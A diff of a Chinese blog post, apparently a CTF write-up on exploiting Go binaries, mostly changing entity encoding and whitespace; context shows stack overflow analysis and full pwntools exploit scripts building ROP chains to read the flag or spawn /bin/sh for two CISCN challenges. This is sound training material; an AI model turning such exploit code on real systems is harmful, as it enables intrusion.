@@ -693,12 +693,11 @@
 			<h4 id="go-pwn的特点"><a href="#go-pwn的特点" class="headerlink" title="go pwn的特点"></a>go pwn的特点</h4><ul>
 <li><strong>Golang</strong> 使用了自己的运行时和内存管理机制。Go 的堆栈是可扩展的（split-stack model），即每个 Goroutine 的堆栈大小可以动态扩展。这使得堆栈布局更加复杂，和固定大小的堆栈相比更难预测。</li>
 <li>无标准栈帧，也就是不怎么依靠rbp作为栈帧指针（但实际那个位置有时还是维护rbp），通常通过rsp进行局部变量寻址。</li>
-<li>Go 语言依赖垃圾回收器管理内存，而 C&#x2F;C++ 依赖程序员手动管理内存。这意味着在 Go 程序中，利用内存分配漏洞（如 UAF 或 double free）时，必须考虑到垃圾回收器的行为。</li>
-<li>Go 语言的异常处理机制是通过 <code>panic</code> 和 <code>recover</code> 完成的，而不像 C&#x2F;C++ 使用 <code>setjmp/longjmp</code> 或 C++ 的异常捕获机制。这导致堆栈结构和控制流的变化更为复杂，特别是在发生 <code>panic</code> 后。在漏洞利用过程中，如果程序进入了 <code>panic</code> 状态，控制流会被重定向，这可能干扰漏洞利用过程。</li>
-<li>Go 的堆内存管理机制不同于标准的 <code>malloc</code>&#x2F;<code>free</code>。Go 运行时会使用自己的内存分配器，而不是像传统 C&#x2F;C++ 程序中依赖系统的 <code>malloc</code> 和 <code>free</code>。这意味着许多针对 C&#x2F;C++ 堆的利用技术，如 <code>fastbin attack</code>、<code>tcache</code> 等，不适用于 Go 程序。</li>
+<li>Go 语言依赖垃圾回收器管理内存，而 C/C++ 依赖程序员手动管理内存。这意味着在 Go 程序中，利用内存分配漏洞（如 UAF 或 double free）时，必须考虑到垃圾回收器的行为。</li>
+<li>Go 语言的异常处理机制是通过 <code>panic</code> 和 <code>recover</code> 完成的，而不像 C/C++ 使用 <code>setjmp/longjmp</code> 或 C++ 的异常捕获机制。这导致堆栈结构和控制流的变化更为复杂，特别是在发生 <code>panic</code> 后。在漏洞利用过程中，如果程序进入了 <code>panic</code> 状态，控制流会被重定向，这可能干扰漏洞利用过程。</li>
+<li>Go 的堆内存管理机制不同于标准的 <code>malloc</code>/<code>free</code>。Go 运行时会使用自己的内存分配器，而不是像传统 C/C++ 程序中依赖系统的 <code>malloc</code> 和 <code>free</code>。这意味着许多针对 C/C++ 堆的利用技术，如 <code>fastbin attack</code>、<code>tcache</code> 等，不适用于 Go 程序。</li>
 </ul>
 <h4 id="栈扩展机制"><a href="#栈扩展机制" class="headerlink" title="栈扩展机制"></a>栈扩展机制</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">a:</span><br><span class="line">lea     r12, [rsp+var_218]			</span><br><span class="line">cmp     r12, [r14+10h]				//上面两句也有可能是cmp rsp, [r14+10h]这种形式</span><br><span class="line">jbe     loc_4C18C0</span><br><span class="line">......</span><br><span class="line">loc_4C18C0:</span><br><span class="line">mov     [rsp+arg_0], rax</span><br><span class="line">mov     [rsp+arg_8], rbx</span><br><span class="line">mov     [rsp+arg_10], rcx</span><br><span class="line">call    runtime_morestack_noctxt</span><br><span class="line">mov     rax, [rsp+arg_0]</span><br><span class="line">mov     rbx, [rsp+arg_8]</span><br><span class="line">mov     rcx, [rsp+arg_10]</span><br><span class="line">jmp     a</span><br></pre></td></tr></table></figure></div>
-
 <p>r14+0x10地址处存的就是当前栈段的上限信息，不够时会调用runtime_morestack_noctxt进行扩展。call一个函数时与c同样会把返回地址存到栈上，在栈扩展中也会维护好这个返回地址的位置。而每次栈扩展出的新栈与原来的栈是不连续的，但一个栈段只要大小没有耗尽，也可以存多个函数的栈帧。</p>
 <img  
                      lazyload
@@ -706,14 +705,12 @@
                      data-src="/blog/2024/09/22/go-pwn/image-20240922202642330.png"
                       class=""
                 >
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/09/22/go-pwn/image-20240922202650340.png"
                       class=""
                 >
-
 <p>可以看到这里的栈实际不在x86_64常使用的栈段中。而且确实会把返回地址压入栈。</p>
 <h4 id="传参顺序"><a href="#传参顺序" class="headerlink" title="传参顺序"></a>传参顺序</h4><p>传参用到的寄存器依次是：AX，BX，CX，DI，SI，R8，R9，R10，R11</p>
 <h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><h5 id="CISCN-2023-初赛-shallwego"><a href="#CISCN-2023-初赛-shallwego" class="headerlink" title="[CISCN 2023 初赛]shallwego"></a>[CISCN 2023 初赛]shallwego</h5><p>先运行一下看看：</p>
@@ -723,10 +720,8 @@
                      data-src="/blog/2024/09/22/go-pwn/image-20240922202702201.png"
                       class=""
                 >
-
 <p>发现提供了一个shell窗口，但好像要先对cert进行一些操作。看IDA反汇编结果，其中在<strong>main_unk_func0b05</strong>有很多可疑的字符串，经整理大概有如下那么多：</p>
 <div class="highlight-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nAcDsMicN</span><br><span class="line"></span><br><span class="line">echo</span><br><span class="line">exit</span><br><span class="line">cert</span><br><span class="line">cd</span><br><span class="line">cat flag</span><br><span class="line">ls -al</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></div>
-
 <p>其中很多都是命令，有一个字符串是在cert命令后检测的。我们通过动态调试能够发现，r8实际存的是命令（不包括操作符）的长度，rbx存的是输入的整个命令被空格分隔的段数。那我们就可以先执行个 <code>cert nAcDsMicN abcdefg</code> 动调看看。</p>
 <img  
                      lazyload
@@ -734,7 +729,6 @@
                      data-src="/blog/2024/09/22/go-pwn/image-20240922202742958.png"
                       class=""
                 >
-
 <p>之后会进入 <strong>main_unk_func0b01</strong> 中，这里实际对我们输入的第三段（其实这里我们已经可以看作大概是<code>cert 用户名 密码</code>这样一个认证过程）进行加密，与一个写死的字符串进行比较，而且rc4加密的密钥也直接写在程序中了。那么我们就可以先将密文base64解码后，把得到的内容当作密码输入进去，然后看rc4加密后的结果，这个结果就是正确的密码了，因为rc4是对称加密算法。最终得到的密码值为<strong>S33UAga1n@#!</strong></p>
 <img  
                      lazyload
@@ -742,14 +736,12 @@
                      data-src="/blog/2024/09/22/go-pwn/image-20240922202759540.png"
                       class=""
                 >
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/09/22/go-pwn/image-20240922202808837.png"
                       class=""
                 >
-
 <p>然后shell提示符就会变成 <code>nightingale#</code> ，之后也可以正常调用其他的设置好的命令，但给的那几个命令都不能直接获取真实flag的值，需要再次寻找漏洞点。经过分析发现别的命令都没什么问题，唯独echo这个命令有两段函数专门处理。并且能打印出我们输入的内容，可以尝试进行栈溢出。</p>
 <img  
                      lazyload
@@ -757,7 +749,6 @@
                      data-src="/blog/2024/09/22/go-pwn/image-20240922202821181.png"
                       class=""
                 >
-
 <p>看到这兴奋起来了，因为这里往栈上写了0x75，也就是u，看来是要开始将输入内容存到栈上了。我们的返回地址在<strong>0xc00011adc8</strong>，而输入从<strong>0xc00011ab98</strong>开始存，其中间隔了0x230个字节。然后这个循环中实际有<code>cmp dl, &#39;+&#39;</code>这个条件判断，如果满足会直接调回去自增rax，也就是循环中的下标自增，直接跳过了后面往栈上写的部分。</p>
 <p>那我们先试试echo 0x230字节的垃圾字符看看。</p>
 <img  
@@ -766,7 +757,6 @@
                      data-src="/blog/2024/09/22/go-pwn/image-20240922202832431.png"
                       class=""
                 >
-
 <p>发现这里最后rdx大于0x200，就直接略过了将值赋值到栈上的操作。说明单次输入不能超过0x200字节，那如果我们在输入中间加入空格呢？</p>
 <img  
                      lazyload
@@ -774,7 +764,6 @@
                      data-src="/blog/2024/09/22/go-pwn/image-20240922202844042.png"
                       class=""
                 >
-
 <p>这次成功跳过了大小的检测，再往下执行看看效果。</p>
 <img  
                      lazyload
@@ -782,20 +771,15 @@
                      data-src="/blog/2024/09/22/go-pwn/image-20240922202852228.png"
                       class=""
                 >
-
 <p>然后发现直接崩掉了，因为rax是一个下标，所以推断是rbx被更改了以至于赋值失败，那么rbx是在哪里被赋值的呢。实际前面有一句<code>mov rbx, [rsp+298h+var_20]</code>,也就是这个rbx基址是存在<strong>ret_addr-0x20</strong>处的。那我们不能更改这个位置的值，但我们又无法获知这个位置的值，该怎么办呢？很巧的是，程序刚好碰到+会跳过赋值，所以我们可以用8个+来保存rbx。其实也不必那么麻烦，直接全用+填充，最后再覆盖也行。然后就能成功覆盖返回地址，但这里这个填充字符数有点迷，最后我本地动调后填充了0x229个字节后才覆盖到返回地址。</p>
-<p>之后是正常的ROP，因为有syscall，就先把&#x2F;bin&#x2F;sh读取到一个地方，然后再用execve调用打即可。最后复现时本地能够用execve通，但远程却有问题，只能拿orw打，不知道是为什么。</p>
+<p>之后是正常的ROP，因为有syscall，就先把/bin/sh读取到一个地方，然后再用execve调用打即可。最后复现时本地能够用execve通，但远程却有问题，只能拿orw打，不知道是为什么。</p>
 <h6 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h6><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的 Base64 编码字符串</span></span><br><span class="line">encoded_str = <span class="string">&quot;JLIX8pbSvYZu/WaG&quot;</span></span><br><span class="line"><span class="comment"># 进行 Base64 解码</span></span><br><span class="line">decoded_bytes = base64.b64decode(encoded_str)</span><br><span class="line"><span class="comment"># 打印解码后的字节字符串</span></span><br><span class="line"><span class="built_in">print</span>(decoded_bytes)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./service&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.anna.nssctf.cn&quot;,28629)</span></span><br><span class="line">passwd = <span class="string">b&quot;S33UAga1n@#!&quot;</span></span><br><span class="line">payload = <span class="string">b&quot;cert nAcDsMicN &quot;</span> + passwd</span><br><span class="line">p.sendlineafter(<span class="string">&quot;shell$&quot;</span>,payload)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000444fec</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000041e818</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x000000000049e11d</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000040d9e6</span></span><br><span class="line">syscall = <span class="number">0x000000000040328c</span></span><br><span class="line">ret = <span class="number">0x000000000040103d</span></span><br><span class="line">main = <span class="number">0x00000000004C1D60</span></span><br><span class="line">data = <span class="number">0x5A34A0</span></span><br><span class="line">payload = (<span class="string">b&quot;echo &quot;</span>.ljust(<span class="number">0x1f0</span>,<span class="string">b&quot;A&quot;</span>) + <span class="string">b&quot; &quot;</span>).ljust(<span class="number">0x229</span>,<span class="string">b&quot;+&quot;</span>) + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x8</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>) + p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(syscall) </span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x40</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>) + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x40</span>) + p64(syscall)</span><br><span class="line"><span class="comment">#+ p64(pop_rax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(syscall) + p64(main)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;nightingale#&quot;</span>,payload)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&quot;/flag\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-
-
 <h5 id="CISCN-2024-初赛-gostack"><a href="#CISCN-2024-初赛-gostack" class="headerlink" title="[CISCN 2024 初赛]gostack"></a>[CISCN 2024 初赛]gostack</h5><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/09/22/go-pwn/image-20240922202922399.png"
                       class=""
                 >
-
 <p>先运行一遍找提示字符串，看到调用位置在main_func3，直接gdb打断点进去调试一下。发现输入存在如下位置，但是存在栈上的是指针，没什么用。</p>
 <img  
                      lazyload
@@ -803,7 +787,6 @@
                      data-src="/blog/2024/09/22/go-pwn/image-20240922202932191.png"
                       class=""
                 >
-
 <p>之后还会把数据写到栈的另一个地方，这里直接把内容复制到栈上了，并且没有检测加跳转，可能会有溢出。</p>
 <img  
                      lazyload
@@ -811,28 +794,23 @@
                      data-src="/blog/2024/09/22/go-pwn/image-20240922202943137.png"
                       class=""
                 >
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/09/22/go-pwn/image-20240922202953894.png"
                       class=""
                 >
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/09/22/go-pwn/image-20240922203005886.png"
                       class=""
                 >
-
 <p>然后我们再看看程序的其他部分，其中有个<strong>main_executeCommand</strong>函数引入注目，其中有如下两个子函数：</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call    os_exec_Command</span><br><span class="line">...</span><br><span class="line">call    os_exec__ptr_Cmd_Run</span><br></pre></td></tr></table></figure></div>
-
 <p>其中前者用于创建一个 <code>Cmd</code> 对象，后者用于执行真正的命令。</p>
 <p>那么我们试试直接填充0x1d0字节，然后把返回地址覆盖为<strong>main_executeCommand</strong>地址。结果会在最后<code>fmt_Fprintf-&gt;fmt__ptr_pp_doPrintf-&gt;fmt__ptr_pp_printArg-&gt;fmt__ptr_pp_fmtString-&gt;fmt__ptr_fmt_fmtS-&gt;fmt__ptr_fmt_padString-&gt;runtime_growslice</code>这个调用链然后gopanic退出，其提示信息为<code>&quot;growslice: cap out of rangeinternal loc&quot;...</code>，也就是说Go 语言在处理切片（slice）扩容时，发生容量超出合理范围时的一个运行时错误。</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x449852    mov    rdi, rsi                        RDI =&gt; 0x4141414141414155 (&#x27;UAAAAAAA&#x27;)</span><br><span class="line">......</span><br><span class="line">0x449939    movabs r8, 0x1000000000000         R8 =&gt; 0x1000000000000</span><br><span class="line">0x449943    cmp    rsi, r8                     0x4141414141414155 - 0x1000000000000     EFLAGS =&gt; 0x206 [ cf PF af zf sf IF df of ]</span><br><span class="line">0x449946    seta   r9b</span><br><span class="line">0x44994a    mov    rsi, rcx                    RSI =&gt; 0x14</span><br><span class="line">0x44994d    mov    r10, rdx                    R10 =&gt; 0x4141414141416000</span><br><span class="line">0x449950    jmp    0x449c69                    &lt;0x449c69&gt;</span><br><span class="line">↓</span><br><span class="line">0x449c69    test   r9b, r9b     1 &amp; 1     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ]</span><br><span class="line">0x449c6c  ✔ jne    0x449d4d                    &lt;0x449d4d&gt;</span><br></pre></td></tr></table></figure></div>
-
 <p>我们稍微往前看就可以发现这里rsi和r8的比较实际上应该就是判断切片大小，而存大小的位置被我们覆盖成为了一堆A。也就是说我们破坏了<code>fmt_Fprintf</code>的一些参数。那我们就打断点在这个函数处看看哪些参数被覆盖成了一堆A。rdx很可疑。但前面调用<code>runtime_convTstring</code>后就没有动过rdx了，这个<code>runtime_convTstring</code>函数也比较短，可以跟进去看看。</p>
 <img  
                      lazyload
@@ -840,22 +818,19 @@
                      data-src="/blog/2024/09/22/go-pwn/image-20240922203024108.png"
                       class=""
                 >
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/09/22/go-pwn/image-20240922203039143.png"
                       class=""
                 >
-
-<p>其中唯一修改了rdx的是这一句，这个函数的栈帧在一开始 <code>sub rsp, 20h</code> 扩充的空间，这里是把rsp+0x30处的内容复制过来，而rsp+0x30处内容前面有 <code>mov qword ptr [rsp + 0x30], rbx </code> 的修改，而我们进这个函数前rbx就已经是0x4141414141414141了，还要往前追溯。发现前面刚好有个 <code>mov rbx, [rsp+208h+var_C8]</code> ，也就是说我们不能把这个位置的数值覆盖掉。经过进一步用正常数值调试发现，这个位置存的其实就是我们输入的大小。那么我们可以试试先填充0x108个垃圾字符，然后输入大小，之后再正常填充。</p>
+<p>其中唯一修改了rdx的是这一句，这个函数的栈帧在一开始 <code>sub rsp, 20h</code> 扩充的空间，这里是把rsp+0x30处的内容复制过来，而rsp+0x30处内容前面有 <code>mov qword ptr [rsp + 0x30], rbx</code> 的修改，而我们进这个函数前rbx就已经是0x4141414141414141了，还要往前追溯。发现前面刚好有个 <code>mov rbx, [rsp+208h+var_C8]</code> ，也就是说我们不能把这个位置的数值覆盖掉。经过进一步用正常数值调试发现，这个位置存的其实就是我们输入的大小。那么我们可以试试先填充0x108个垃圾字符，然后输入大小，之后再正常填充。</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/09/22/go-pwn/image-20240922203058314.png"
                       class=""
                 >
-
 <p>前面的判断绕过了，但在fmt函数中还是崩，但这次是rcx的问题。往前找找，发现是这个<code>runtime_memmove</code>函数的第二个参数源地址被覆盖掉了。</p>
 <img  
                      lazyload
@@ -863,7 +838,6 @@
                      data-src="/blog/2024/09/22/go-pwn/image-20240922203113527.png"
                       class=""
                 >
-
 <p>我们直接把前面要填充的垃圾字符都换成一个可写的地址试试，成功绕过了这个死亡之call，也算是成功地绕过了所有阻碍，终于能劫持控制流返回了（这写了个0x4a0120覆盖返回地址进行测试）。</p>
 <img  
                      lazyload
@@ -871,24 +845,20 @@
                      data-src="/blog/2024/09/22/go-pwn/image-20240922203128877.png"
                       class=""
                 >
-
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/09/22/go-pwn/image-20240922203145314.png"
                       class=""
                 >
-
-<p>后面就可以直接ret2syscall了，这里我本来还想靠<strong>os_exec_Command</strong>玩一下，但还是要先靠read把&#x2F;bin&#x2F;sh读到一个地方，不如直接调用execve。需要注意的是这个syscall会后面带着改栈上的内容，如下图这样rop链就会被打断，需要绕一下。</p>
+<p>后面就可以直接ret2syscall了，这里我本来还想靠<strong>os_exec_Command</strong>玩一下，但还是要先靠read把/bin/sh读到一个地方，不如直接调用execve。需要注意的是这个syscall会后面带着改栈上的内容，如下图这样rop链就会被打断，需要绕一下。</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/09/22/go-pwn/image-20240922203202348.png"
                       class=""
                 >
-
 <h6 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h6><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./gostack&quot;</span>)</span><br><span class="line">bss_add = <span class="number">0x00000000005633C0</span></span><br><span class="line">syscall = <span class="number">0x0000000000404043</span></span><br><span class="line">pop_rdi_5reg_ret = <span class="number">0x00000000004a18a5</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000042138a</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000004944ec</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000040f984</span></span><br><span class="line">rop = p64(pop_rdi_5reg_ret) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(pop_rsi_ret) + p64(bss_add) + p64(pop_rdx_ret) + p64(<span class="number">0x8</span>) + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">rop += (p64(pop_rdi_5reg_ret) + p64(bss_add)*<span class="number">6</span>)*<span class="number">3</span> + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(pop_rax_ret) + p64(<span class="number">0x3b</span>) + p64(syscall)</span><br><span class="line"></span><br><span class="line">payload = (p64(bss_add)*<span class="number">33</span> + p64(<span class="number">0x1d8</span>))+(p64(bss_add)*<span class="number">24</span>) + rop</span><br><span class="line">log.success(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your magic message :&quot;</span>,payload)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
-
 
 		</div>
 
@@ -1046,7 +1016,7 @@
                     </span>
                     
                         <span>
-                            共 120.3k 字
+                            共 120k 字
                         </span>
                     
                 </p>
